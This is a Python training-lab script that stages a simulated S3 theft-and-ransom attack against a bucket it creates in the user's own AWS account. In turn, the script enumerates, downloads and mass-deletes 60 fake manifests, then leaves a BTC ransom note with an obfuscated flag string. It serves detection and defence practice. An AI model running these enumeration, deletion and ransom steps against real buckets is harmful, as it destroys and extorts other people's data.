#!/usr/bin/env python3
"""Lab 2.2 · Summon the Kraken — an S3 smash-and-grab against YOUR OWN sandbox bucket.

    AWS_PROFILE=sky-prod python3 kraken-chain.py

What it does (all inside the current account, us-east-1):
  1. Creates s3://nimbus-cargo-manifests-<acct> and fills it with 60 fake cargo manifests.
  2. As "the Kraken" (custom user agent), enumerates buckets, lists, downloads every object.
  3. Deletes every manifest (ATT&CK T1485) and leaves a ransom note (README_KRAKEN.txt).

Nothing leaves your account. Run kraken-cleanup.sh afterwards.
"""
import base64
import json
import random
import time

import boto3
from botocore.config import Config

_d = lambda s: base64.b64decode(s[::-1]).decode()
UA = "KrakenCollective/6.6.6 (tentacle-ops)"
REGION = "us-east-1"

acct = boto3.client("sts").get_caller_identity()["Account"]
bucket = f"nimbus-cargo-manifests-{acct}"

victim = boto3.client("s3", region_name=REGION)  # "legit" Nimbus tooling
kraken = boto3.client("s3", region_name=REGION, config=Config(user_agent_extra=UA))

print(f"[nimbus] creating {bucket}")
try:
    victim.create_bucket(Bucket=bucket)
except victim.exceptions.BucketAlreadyOwnedByYou:
    pass
victim.put_bucket_tagging(Bucket=bucket, Tagging={"TagSet": [
    {"Key": "data-classification", "Value": "restricted"}, {"Key": "owner", "Value": "cargo-ops"}]})

ports = ["Ceres Station", "Titan Dock 4", "Luna Gateway", "Europa Deep", "Mars Olympus Yard"]
for i in range(60):
    manifest = {"manifest_id": f"NIM-{48000 + i}", "origin": random.choice(ports), "destination": random.choice(ports),
                "cargo": random.choice(["helium-3", "medical cryo-pods", "terraforming seeds", "quantum relays"]),
                "insured_value_credits": random.randint(10_000, 9_000_000)}
    victim.put_object(Bucket=bucket, Key=f"manifests/2026/{manifest['manifest_id']}.json",
                      Body=json.dumps(manifest).encode())
print("[nimbus] 60 manifests stored. Business as usual...")
time.sleep(3)

print("[kraken] 🐙 tentacles in. Discovery...")
kraken.list_buckets()
kraken.get_bucket_location(Bucket=bucket)
tags = kraken.get_bucket_tagging(Bucket=bucket)["TagSet"]
print(f"[kraken] ooh, tags say: {tags} — jackpot")
keys = [o["Key"] for p in kraken.get_paginator("list_objects_v2").paginate(Bucket=bucket) for o in p.get("Contents", [])]

print(f"[kraken] Collection: downloading {len(keys)} objects")
for k in keys:
    kraken.get_object(Bucket=bucket, Key=k)["Body"].read()

print("[kraken] Impact: deleting originals")
for i in range(0, len(keys), 1000):
    kraken.delete_objects(Bucket=bucket, Delete={"Objects": [{"Key": k} for k in keys[i:i + 1000]], "Quiet": True})

note = f"""
        ~~~ THE KRAKEN COLLECTIVE ~~~
   Your cargo manifests now live in the deep.
   60 files. 0 backups. 1 very sad owl.

   Want them back? Send 40 BTC to the abyss.
   (Or, you know, turn on versioning + Object Lock next time.)

   proof-of-tentacle: {_d("9VGdv52Xh9FdmVGbf5WZrFmcr9VZoR3eZt0U")}
"""
kraken.put_object(Bucket=bucket, Key="README_KRAKEN.txt", Body=note.encode())
print("[kraken] ransom note delivered. 🐙  Now go be the defender.")
